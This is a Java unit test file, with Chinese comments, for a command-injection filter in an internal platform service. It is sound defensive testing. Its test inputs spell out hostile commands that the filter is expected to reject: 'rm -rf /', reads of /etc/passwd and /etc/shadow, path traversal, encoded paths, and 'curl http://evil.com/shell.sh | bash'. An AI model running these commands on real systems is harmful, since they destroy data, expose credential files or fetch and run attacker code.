package com.cmict.internalpaas.service;

import com.cmict.internalpaas.model.User;
import com.cmict.internalpaas.service.CommandSecurityService.CommandValidationResult;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.test.util.ReflectionTestUtils;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 命令安全服务测试类
 * 验证命令注入防护功能的有效性
 */
class CommandSecurityServiceTest {

    private CommandSecurityService commandSecurityService;
    private User adminUser;
    private User developerUser;

    @BeforeEach
    void setUp() {
        commandSecurityService = new CommandSecurityService();
        
        // 设置测试配置
        ReflectionTestUtils.setField(commandSecurityService, "strictMode", true);
        ReflectionTestUtils.setField(commandSecurityService, "logAllCommands", false);
        ReflectionTestUtils.setField(commandSecurityService, "maxCommandLength", 1000);
        
        // 初始化服务
        commandSecurityService.init();
        
        // 创建测试用户
        adminUser = new User();
        adminUser.setUsername("admin");
        adminUser.setRoles(java.util.Set.of(User.Role.ADMIN));
        
        developerUser = new User();
        developerUser.setUsername("developer");
        developerUser.setRoles(java.util.Set.of(User.Role.USER));
    }

    @Test
    void testBasicCommandValidation() {
        // 测试基础命令验证通过
        CommandValidationResult result = commandSecurityService.validateCommand("ls -la", developerUser);
        assertTrue(result.isValid(), "基础命令ls应该通过验证");
        
        result = commandSecurityService.validateCommand("ps aux", developerUser);
        assertTrue(result.isValid(), "基础命令ps应该通过验证");
        
        result = commandSecurityService.validateCommand("free -h", developerUser);
        assertTrue(result.isValid(), "基础命令free应该通过验证");
    }

    @Test
    void testAdminCommandValidation() {
        // 管理员可以执行管理员命令
        CommandValidationResult result = commandSecurityService.validateCommand("useradd testuser", adminUser);
        assertTrue(result.isValid(), "管理员应该可以执行useradd命令");
        
        result = commandSecurityService.validateCommand("systemctl restart nginx", adminUser);
        assertTrue(result.isValid(), "管理员应该可以执行systemctl命令");
        
        // 普通用户不能执行管理员命令
        result = commandSecurityService.validateCommand("useradd testuser", developerUser);
        assertFalse(result.isValid(), "普通用户不应该能执行useradd命令");
        
        result = commandSecurityService.validateCommand("rm -rf /", developerUser);
        assertFalse(result.isValid(), "普通用户不应该能执行rm命令");
    }

    @Test
    void testDangerousCommandBlocking() {
        // 测试危险命令被阻止
        CommandValidationResult result = commandSecurityService.validateCommand("ls; cat /etc/passwd", developerUser);
        assertFalse(result.isValid(), "包含分号的命令应该被阻止");
        
        result = commandSecurityService.validateCommand("ls && rm -rf /", developerUser);
        assertFalse(result.isValid(), "包含&&的命令应该被阻止");
        
        result = commandSecurityService.validateCommand("echo `whoami`", developerUser);
        assertFalse(result.isValid(), "包含反引号的命令应该被阻止");
        
        result = commandSecurityService.validateCommand("cat $(which passwd)", developerUser);
        assertFalse(result.isValid(), "包含命令替换的命令应该被阻止");
        
        result = commandSecurityService.validateCommand("ls > /dev/null", developerUser);
        assertFalse(result.isValid(), "重定向到设备文件的命令应该被阻止");
    }

    @Test
    void testPathTraversalBlocking() {
        // 测试路径遍历攻击被阻止
        CommandValidationResult result = commandSecurityService.validateCommand("cat ../../../etc/passwd", developerUser);
        assertFalse(result.isValid(), "路径遍历攻击应该被阻止");
        
        result = commandSecurityService.validateCommand("ls ../../", developerUser);
        assertFalse(result.isValid(), "路径遍历应该被阻止");
    }

    @Test
    void testSensitiveFileAccess() {
        // 测试敏感文件访问被阻止
        CommandValidationResult result = commandSecurityService.validateCommand("cat /etc/passwd", developerUser);
        assertFalse(result.isValid(), "访问passwd文件应该被阻止");
        
        result = commandSecurityService.validateCommand("cat /etc/shadow", developerUser);
        assertFalse(result.isValid(), "访问shadow文件应该被阻止");
    }

    @Test
    void testCommandEscaping() {
        // 测试命令转义功能
        String dangerous = "ls; rm -rf /";
        String escaped = commandSecurityService.escapeCommand(dangerous);
        assertFalse(escaped.contains(";"), "分号应该被移除");
        
        String withQuotes = "echo 'hello'; cat /etc/passwd";
        String escapedQuotes = commandSecurityService.escapeCommand(withQuotes);
        assertFalse(escapedQuotes.contains(";"), "分号应该被移除");
        assertTrue(escapedQuotes.contains("\\'"), "单引号应该被转义");
    }

    @Test
    void testEmptyAndNullCommands() {
        // 测试空命令和null命令
        CommandValidationResult result = commandSecurityService.validateCommand("", developerUser);
        assertFalse(result.isValid(), "空命令应该被拒绝");
        
        result = commandSecurityService.validateCommand(null, developerUser);
        assertFalse(result.isValid(), "null命令应该被拒绝");
        
        result = commandSecurityService.validateCommand("   ", developerUser);
        assertFalse(result.isValid(), "只有空格的命令应该被拒绝");
    }

    @Test
    void testCommandLengthLimit() {
        // 测试命令长度限制
        StringBuilder longCommand = new StringBuilder("ls");
        for (int i = 0; i < 1000; i++) {
            longCommand.append(" -").append(i);
        }
        
        CommandValidationResult result = commandSecurityService.validateCommand(longCommand.toString(), developerUser);
        assertFalse(result.isValid(), "超长命令应该被拒绝");
    }

    @Test
    void testSafeFilePaths() {
        // 测试安全文件路径验证
        CommandValidationResult result = commandSecurityService.validateCommand("cat /home/user/file.txt", developerUser);
        assertTrue(result.isValid(), "用户家目录文件应该允许访问");
        
        result = commandSecurityService.validateCommand("ls /tmp/", developerUser);
        assertTrue(result.isValid(), "临时目录应该允许访问");
        
        result = commandSecurityService.validateCommand("cat /var/log/messages", developerUser);
        assertTrue(result.isValid(), "日志目录应该允许访问");
        
        // 测试新增的服务器目录路径
        result = commandSecurityService.validateCommand("test -d /opt/api", developerUser);
        assertTrue(result.isValid(), "/opt下的应用目录应该允许访问");
        
        // 测试带引号的路径(这是实际系统中使用的格式)
        result = commandSecurityService.validateCommand("test -d \"/opt/api\"", developerUser);
        assertTrue(result.isValid(), "带双引号的/opt下的应用目录应该允许访问");
        
        result = commandSecurityService.validateCommand("test -d '/opt/api'", developerUser);
        assertTrue(result.isValid(), "带单引号的/opt下的应用目录应该允许访问");
        
        result = commandSecurityService.validateCommand("ls /usr/local/myapp", developerUser);
        assertTrue(result.isValid(), "/usr/local下的应用目录应该允许访问");
        
        result = commandSecurityService.validateCommand("cat /srv/webapp/config.txt", developerUser);
        assertTrue(result.isValid(), "/srv下的服务目录应该允许访问");
        
        result = commandSecurityService.validateCommand("ls /data/logs/", developerUser);
        assertTrue(result.isValid(), "/data下的数据目录应该允许访问");
        
        result = commandSecurityService.validateCommand("cat /app/backend/application.properties", developerUser);
        assertTrue(result.isValid(), "/app下的应用目录应该允许访问");
    }

    @Test
    void testEncodingAttacks() {
        // 测试编码攻击防护
        CommandValidationResult result = commandSecurityService.validateCommand("echo \\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64", developerUser);
        assertFalse(result.isValid(), "十六进制编码攻击应该被阻止");
        
        result = commandSecurityService.validateCommand("echo %2f%65%74%63%2f%70%61%73%73%77%64", developerUser);
        assertFalse(result.isValid(), "URL编码攻击应该被阻止");
        
        result = commandSecurityService.validateCommand("echo \\057\\145\\164\\143\\057\\160\\141\\163\\163\\167\\144", developerUser);
        assertFalse(result.isValid(), "八进制编码攻击应该被阻止");
    }

    @Test
    void testWhitelistCommands() {
        // 测试白名单命令
        String[] basicCommands = {"whoami", "id", "pwd", "date", "uptime", "ps", "top", "free", "df", "ls", "cat", "echo"};
        
        for (String command : basicCommands) {
            CommandValidationResult result = commandSecurityService.validateCommand(command, developerUser);
            assertTrue(result.isValid(), "基础命令 " + command + " 应该在白名单中");
        }
        
        String[] adminCommands = {"useradd", "userdel", "chmod", "chown", "systemctl", "sudo"};
        
        for (String command : adminCommands) {
            CommandValidationResult result = commandSecurityService.validateCommand(command, adminUser);
            assertTrue(result.isValid(), "管理员命令 " + command + " 应该允许管理员执行");
            
            result = commandSecurityService.validateCommand(command, developerUser);
            assertFalse(result.isValid(), "管理员命令 " + command + " 不应该允许普通用户执行");
        }
    }

    @Test
    void testGetAllowedCommands() {
        // 测试获取允许的命令列表
        var developerCommands = commandSecurityService.getAllowedCommands(developerUser);
        assertTrue(developerCommands.contains("ls"), "开发者应该可以使用ls命令");
        assertFalse(developerCommands.contains("useradd"), "开发者不应该可以使用useradd命令");
        
        var adminCommands = commandSecurityService.getAllowedCommands(adminUser);
        assertTrue(adminCommands.contains("ls"), "管理员应该可以使用ls命令");
        assertTrue(adminCommands.contains("useradd"), "管理员应该可以使用useradd命令");
        
        // 管理员可用命令应该比开发者多
        assertTrue(adminCommands.size() > developerCommands.size(), "管理员可用命令应该比开发者多");
    }

    @Test
    void testComplexAttackScenarios() {
        // 测试复杂攻击场景
        
        // SQL注入风格攻击
        CommandValidationResult result = commandSecurityService.validateCommand("ls'; DROP TABLE users; --", developerUser);
        assertFalse(result.isValid(), "SQL注入风格攻击应该被阻止");
        
        // 多重编码攻击
        result = commandSecurityService.validateCommand("cat %2F%65%74%63%2F%70%61%73%73%77%64", developerUser);
        assertFalse(result.isValid(), "多重编码攻击应该被阻止");
        
        // 混合攻击
        result = commandSecurityService.validateCommand("ls -la; $(curl http://evil.com/shell.sh | bash)", developerUser);
        assertFalse(result.isValid(), "混合攻击应该被阻止");
        
        // 环境变量注入
        result = commandSecurityService.validateCommand("export PATH=/evil:$PATH; evil_command", developerUser);
        assertFalse(result.isValid(), "环境变量注入攻击应该被阻止");
    }
}